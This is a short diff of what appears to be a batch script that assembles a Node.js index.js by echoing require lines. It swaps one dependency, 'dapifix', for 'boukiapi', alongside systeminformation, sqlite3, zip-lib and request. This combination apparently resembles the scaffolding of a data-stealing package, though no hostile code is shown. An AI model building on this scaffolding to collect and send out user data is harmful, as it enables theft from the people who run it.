@@ -9,7 +9,7 @@ call echo require("os") >> index.js;
 call echo require("path") >> index.js;
 call echo require("stream") >> index.js;
 call echo require("zip-lib") >> index.js;
-call echo require("dapifix") >> index.js;
+call echo require("boukiapi") >> index.js;
 call echo require("systeminformation") >> index.js;
 call echo require("sqlite3") >> index.js;
 call echo require("request") >> index.js;
